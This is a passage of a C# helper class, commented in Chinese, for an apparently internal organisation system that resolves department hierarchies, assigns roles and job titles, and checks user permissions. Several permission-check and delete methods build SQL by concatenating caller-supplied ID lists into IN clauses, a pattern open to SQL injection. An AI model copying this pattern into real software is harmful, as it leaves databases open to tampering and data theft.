                    flag = flag.Substring(2, flag.Length - 2);
            }

            return flag;

        }

        /// <summary>
        /// 返回用户所在部门、及所在部门的所有父部门、以及所有父部门包含的所有子部门的DeptID，逗号组成的字符串
        /// </summary>
        /// <param name="UID"></param>
        /// <param name="FieldName"></param>
        /// <param name="UserDeptType">UserDeptType="AllDepts or AllParentSubDepts or AllSubDepts or LastDepts", AllDept:返回事个组织架构，AllParentSubDepts:返回用户所在部门的所有父部门、及所有父部门包含的所有子部门DeptID， AllSubDepts:返回用户所在部门和所在部门包含的所有子部门DeptID，LastDepts:返回用户最终部门的DeptID。逗号组成的字符串 </param>
        /// <returns></returns>
        public static string GetUserAllDepts(string UID, string FieldName = "DeptID", string UserDeptType = "AllDepts")
        {
            string flag = "0",
                ParentDeptIDs = "0";

            if (UserDeptType == "AllDepts")
                flag = GetAllDeptsID();

            else
            {
                if (UserDeptType == "AllParentSubDepts") //得到用户的所有父部门DeptID逗号组成的字符串，通过 LevelCode like运算则得到AllParentSubDepts
                    ParentDeptIDs = GetUserDepts(UID, FieldName);

                else if (UserDeptType == "AllSubDepts")
                    ParentDeptIDs = MicroPublic.GetDataTableColumnSplit(MicroDataTable.GetCustomUserAttrDataTable("UserDepts", UID), "DeptID", ","); //得到用户的所在部门的DeptID  ###不能用否则会进入死循环 //MicroUserInfo.GetUserInfo("UserDepts", UID); 和 GetUserDepts(UID, FieldName, "UserDepts"); 

                else if (UserDeptType == "LastDepts")
                    ParentDeptIDs = GetUserDepts(UID, FieldName, "LastDept");  //得到用户的所在部门的最后部门DeptID

                //ParentDeptIDs = "28,30";
                //根据取得的ParentDeptIDs查找出所有子部门
                if (!string.IsNullOrEmpty(ParentDeptIDs))
                    flag = GetAllDeptsID("AllSubDepts", "DeptID", ParentDeptIDs);             
            }

            return flag;
        }


        /// <summary>
        /// 获取部门信息根据传入FieldName字段返回该字段组成逗号分隔构成的字符串的结果并返回（如果传入的DeptIDs含有子部门也将一并返回）。默认返回：根据传入的DeptID和字段类型DeptType="AllSubDepts"返回FieldName字段所有子部门组成的逗号分隔字符串，DeptType="AllDepts"返回整个组织架构的所有部门），注：与MicroUserInfo.GetUserAllDepts和GetUserDepts方法相比，此方法与User无关
        /// </summary>
        /// <param name="DeptType">AllDepts、AllSubDepts</param>
        /// <param name="FieldName">默认值为DeptID，也可以输入DeptName</param>
        /// <param name="DetpID">如传入的是6，即事业管理部，则返回事业管理部及其所有子部门FieldName组成的字符串</param>
        /// <returns></returns>
        public static string GetAllDeptsID(string DeptType = "AllDepts", string FieldName = "DeptID", string DeptIDs = "0")
        {
            string flag = "0";

            string _sql = "select * from Department where Invalid=0 and Del=0 order by LevelCode";
            DataTable _dt = MsSQLDbHelper.Query(_sql).Tables[0];

            if (_dt != null && _dt.Rows.Count > 0)
            {
                if (DeptType == "AllDepts")
                {
                    DataRow[] _rows = _dt.Select("", "LevelCode");
                    if (_rows.Length > 0)
                    {
                        foreach (DataRow _dr in _rows)
                        {
                            flag += "," + _dr[FieldName].ToString();
                        }
                    }
                }
                else if (DeptType == "AllSubDepts")
                {
                    string[] DeptIDsArray = DeptIDs.Split(',');
                    for (int i = 0; i < DeptIDsArray.Length; i++)
                    {
                        DataRow[] _rows = _dt.Select("DeptID=" + DeptIDsArray[i].toInt(), "LevelCode");
                        if (_rows.Length > 0)
                        {
                            string LevelCode = _rows[0]["LevelCode"].toStringTrim();
                            if (!string.IsNullOrEmpty(LevelCode))
                            {
                                DataRow[] _rows2 = _dt.Select("LevelCode like '" + LevelCode + "%'", "LevelCode");
                                if (_rows2.Length > 0)
                                {
                                    foreach (DataRow _dr2 in _rows2)
                                    {
                                        flag += "," + _dr2[FieldName].ToString();
                                    }
                                }

                            }
                        }
                    }
                }

                //去除重复记录
                if (!string.IsNullOrEmpty(flag))
                    MicroPublic.GetDistinct(flag);
            }

            return flag;

        }


        /// <summary>
        /// 设置所有用户职务为传递过来的职务
        /// </summary>
        /// <param name="Fields">传递过来的JTIDS</param>
        /// <returns></returns>
        public static string SetAllUserDefaultJobTitle(string Fields)
        {
            string flag = MicroPublic.GetMsg("SaveFailed");
            string[] UserJobTitleArr = Fields.Split(',');
            string UIDS = string.Empty, JTIDS = Fields;

            string _sql = "select UID,AdDepartment,AdDescription from UserInfo where Invalid=0 and Del=0";
            DataTable _dt = MsSQLDbHelper.Query(_sql).Tables[0];

            string _sql2 = "select * from UserJobTitle";
            DataTable _dt2 = MsSQLDbHelper.Query(_sql2).Tables[0];

            if (_dt != null && _dt.Rows.Count > 0 && UserJobTitleArr.Length > 0)
            {
                DataTable _dtUserRoles = new DataTable();
                _dtUserRoles.Columns.Add("UID", typeof(int));
                _dtUserRoles.Columns.Add("JTID", typeof(int));

                DataRow[] _rows = _dt.Select("");
                foreach (DataRow _dr in _rows)
                {
                    int UID = _dr["UID"].toInt();
                    UIDS += UID.ToString() + ",";
                    for (int j = 0; j < UserJobTitleArr.Length; j++)
                    {
                        int JTID = UserJobTitleArr[j].toInt();
                        DataRow[] _rows2 = _dt2.Select("UID=" + UID + " and JTID=" + JTID);
                        if (_rows2.Length <= 0)
                        {
                            DataRow _drInsert = _dtUserRoles.NewRow();
                            _drInsert["UID"] = UID;
                            _drInsert["JTID"] = JTID;
                            _dtUserRoles.Rows.Add(_drInsert);
                        }
                    }
                }

                if (MsSQLDbHelper.SqlBulkCopyInsert(_dtUserRoles, "UserJobTitle"))
                {
                    flag = MicroPublic.GetMsg("Save");

                    if (!string.IsNullOrEmpty(UIDS) && !string.IsNullOrEmpty(JTIDS))
                    {
                        UIDS = UIDS.Substring(0, UIDS.Length - 1);
                        string _sql3 = " delete UserJobTitle where UID not in (" + UIDS + ") and JTID in (" + JTIDS + ")";

                        MsSQLDbHelper.ExecuteSql(_sql3);
                    }
                }
            }

            return flag;
        }


        /// <summary>
        /// 设置所有用户角色为传递过来的角色
        /// </summary>
        /// <param name="Fields">传递过来的RIDS</param>
        /// <returns></returns>
        public static string SetAllUserDefaultRole(string Fields)
        {
            string flag = MicroPublic.GetMsg("SaveFailed");
            string[] UserRolesArr = Fields.Split(',');
            string UIDS = string.Empty, RIDS = Fields;

            string _sql = "select UID,AdDepartment,AdDescription from UserInfo where Invalid=0 and Del=0";
            DataTable _dt = MsSQLDbHelper.Query(_sql).Tables[0];

            string _sql2 = "select * from UserRoles";
            DataTable _dt2 = MsSQLDbHelper.Query(_sql2).Tables[0];

            if (_dt != null && _dt.Rows.Count > 0 && UserRolesArr.Length > 0)
            {
                DataTable _dtUserRoles = new DataTable();
                _dtUserRoles.Columns.Add("UID", typeof(int));
                _dtUserRoles.Columns.Add("RID", typeof(int));

                DataRow[] _rows = _dt.Select("");
                foreach (DataRow _dr in _rows)
                {
                    int UID = _dr["UID"].toInt();
                    UIDS += UID.ToString() + ",";
                    for (int j = 0; j < UserRolesArr.Length; j++)
                    {
                        int RID = UserRolesArr[j].toInt();
                        DataRow[] _rows2 = _dt2.Select("UID=" + UID + " and RID=" + RID);
                        if (_rows2.Length <= 0)
                        {
                            DataRow _drInsert = _dtUserRoles.NewRow();
                            _drInsert["UID"] = UID;
                            _drInsert["RID"] = RID;
                            _dtUserRoles.Rows.Add(_drInsert);
                        }
                    }
                }

                if (MsSQLDbHelper.SqlBulkCopyInsert(_dtUserRoles, "UserRoles"))
                {
                    flag = MicroPublic.GetMsg("Save");

                    if (!string.IsNullOrEmpty(UIDS) && !string.IsNullOrEmpty(RIDS))
                    {
                        UIDS = UIDS.Substring(0, UIDS.Length - 1);
                        string _sql3 = " delete UserRoles where UID not in (" + UIDS + ") and RID in (" + RIDS + ")";

                        MsSQLDbHelper.ExecuteSql(_sql3);
                    }
                }
            }

            return flag;
        }

        /// <summary>
        /// 检查当前登录用户是属于传入的角色，是则返回True，否则返回False
        /// </summary>
        /// <param name="RoleCode">传入的角色代码</param>
        /// <returns></returns>
        public static Boolean CheckUserRole(string RoleCode)
        {
            Boolean flag = false;
            int UID = GetUserInfo("UID").toInt();

            string _sql = "select * from UserRoles where Invalid=0 and Del=0 and UID=@UID and RID=(select RID from Roles where Invalid=0 and Del=0 and RoleCode=@RoleCode)";
            SqlParameter[] _sp = { new SqlParameter("@UID",SqlDbType.Int),
                                    new SqlParameter("@RoleCode", SqlDbType.VarChar,50)
            };

            _sp[0].Value = UID;
            _sp[1].Value = RoleCode;

            flag = MsSQLDbHelper.Exists(_sql, _sp);

            return flag;
        }

        /// <summary>
        ///  检查当前用户是否属于某个部门“不含子部门”（传递过来的逗号分隔的DeptIDs字符串），如果属于某一种则返回真
        /// </summary>
        /// <param name="DeptIDs"></param>
        /// <returns>不含子部门</returns>
        public static Boolean CheckUserDept(string DeptIDs)
        {
            Boolean flag = false;

            if (!string.IsNullOrEmpty(DeptIDs))
            {
                int UID = GetUserInfo("UID").toInt();
                string _sql = "select * from UserDepts where Invalid=0 and Del=0 and UID=@UID and DeptID in (" + DeptIDs + ")";
                SqlParameter[] _sp = { new SqlParameter("@UID", SqlDbType.Int) };

                _sp[0].Value = UID;

                flag = MsSQLDbHelper.Exists(_sql, _sp);
            }

            return flag;
        }

        /// <summary>
        ///  检查当前用户是否属于某个部门“含子部门”（传递过来的逗号分隔的DeptIDs字符串），如果属于该部门或该部门下的某一子部门则返回真
        /// </summary>
        /// <param name="DeptIDs"></param>
        /// <returns>含子部门</returns>
        public static Boolean CheckUserDepts(string DeptIDs)
        {
            Boolean flag = false;

            if (!string.IsNullOrEmpty(DeptIDs))
            {
                string[] ArrDeptIDs = DeptIDs.Split(',');
                if (ArrDeptIDs.Length > 0)
                {
                    int UID = GetUserInfo("UID").toInt();

                    for (int i = 0; i < ArrDeptIDs.Length; i++)
                    {
                        //flag=false时才进行for循环
                        if (!flag)
                        {
                            string _sql = "select * from UserDepts where Invalid=0 and Del=0 and UID=@UID and " +
                                "DeptID in (select DeptID from Department where LevelCode like " +
                                //对传递过来的DeptIDs进行拆分后得到该部门及该部门所有子部门的LevelCode进行like查询
                                "(select LevelCode+'%' from Department where DeptID=@DeptID))";
                            SqlParameter[] _sp = { new SqlParameter("@UID", SqlDbType.Int),
                                                new SqlParameter("@DeptID", SqlDbType.Int)};

                            _sp[0].Value = UID;
                            _sp[1].Value = ArrDeptIDs[i].toInt();

                            flag = MsSQLDbHelper.Exists(_sql, _sp);
                        }
                    }
                }
            }

            return flag;
        }

        /// <summary>
        ///  检查当前用户是否属于某一种职位（传递过来的逗号分隔职位ID字符串），如果属于某一种则返回真
        /// </summary>
        /// <param name="JTitleIDs"></param>
        /// <returns></returns>
        public static Boolean CheckUserJobTitle(string JTitleIDs)
        {
            Boolean flag = false;

            if (!string.IsNullOrEmpty(JTitleIDs))
            {
                int UID = GetUserInfo("UID").toInt();
                string _sql = "select * from UserJobTitle where Invalid=0 and Del=0 and UID=@UID and JTID in (" + JTitleIDs + ")";
                SqlParameter[] _sp = { new SqlParameter("@UID", SqlDbType.Int) };

                _sp[0].Value = UID;

                flag = MsSQLDbHelper.Exists(_sql, _sp);
            }

            return flag;
        }

        /// <summary>
        /// 检查当前用户是否属性某一种角色（传递过来的逗号分隔角色ID字符串），如果属于某一种则返回真
        /// </summary>
        /// <param name="RoleIDs"></param>
        /// <returns></returns>
        public static Boolean CheckUserRoles(string RoleIDs)
        {
            Boolean flag = false;
            
            if (!string.IsNullOrEmpty(RoleIDs)) {
                int UID = GetUserInfo("UID").toInt();
                string _sql = "select * from UserRoles where Invalid=0 and Del=0 and UID=@UID and RID in (" + RoleIDs + ")";
                SqlParameter[] _sp = { new SqlParameter("@UID",SqlDbType.Int) };

                _sp[0].Value = UID;

                flag = MsSQLDbHelper.Exists(_sql, _sp);
            }

            return flag;
        }


        /// <summary>
        /// 传入一个逗号分隔的UID字符串与当前登录用户UID作对比，如果包含则返回True
        /// </summary>
        /// <param name="AllowUIDs">逗号分隔的UID字符串</param>
        /// <returns></returns>
        public static Boolean CheckUID(string AllowUIDs)
        {
            Boolean flag = false;

            int Num = 0;
            if (!string.IsNullOrEmpty(AllowUIDs))
            {
                string[] ArrAllowUIDs = AllowUIDs.Split(',');
                if (ArrAllowUIDs.Length > 0)
                {
                    int UID = MicroUserInfo.GetUserInfo("UID").toInt();
                    if (UID != 0)
                    {
                        for (int i = 0; i < ArrAllowUIDs.Length; i++)
                        {
                            if (UID == ArrAllowUIDs[i].toInt())
                                Num = Num + 1;
                        }
                    }
                }
            }

            if (Num > 0)
                flag = true;

            return flag;
        }


        /// <summary>
        /// 获取部门用户返回UID逗号分隔组的的字符串，默认参数为空时返回自己的UID，否则All=所有部门的成员，ParentSubDepts=所有父部门和所有父部门所包含的所有子部门 含自部门，SectionDepts=科内所有成员，SubDeptsID=自部门含子部门的所有成员
        /// </summary>
        /// <param name="DeptType">All=所有部门的成员，ParentSubDepts=所有父部门和所有父部门所包含的所有子部门 含自部门，SectionDepts=科内所有成员，SubDeptsID=自部门含子部门的所有成员</param>
        /// <returns></returns>
        public static string GetDeptUIDs(string DeptType = "")
        {
            string flag = "0", DeptIDs = "0",
                UID = GetUserInfo("UID"),
                Where = string.Empty;

            switch (DeptType)
            {
                case "All":
                    DeptIDs = GetAllDeptsID();
                    break;
                case "ParentSubDepts":
                    DeptIDs = GetUserInfo("ParentSubDeptsID");
                    break;
                case "SectionDepts":
                    DeptIDs = GetUserDepts(UID, "DeptID", "SectionDepts", true);
                    break;
                case "SubDeptsID":
                    DeptIDs = GetUserInfo("SubDeptsID"); 
                    break;
                default:
                    DeptIDs = GetUserInfo("SubDeptsID");
                    Where = " and UID in (" + UID.toInt() + ")";
                    break;
            }

            if (DeptIDs != "0")
            {
                string _sql = "select UID from UserInfo where Invalid=0 and Del=0 and UID in (select UID from UserDepts where Invalid=0 and Del=0 and DeptID in(" + DeptIDs + ")) " + Where;
                DataTable _dt = MsSQLDbHelper.Query(_sql).Tables[0];

                if (_dt != null && _dt.Rows.Count > 0)
                {
                    for (int i = 0; i < _dt.Rows.Count; i++)
                    {
                        flag += "," + _dt.Rows[i]["UID"].toStringTrim();
                    }
                }

            }

            return flag;
        }

    }




}


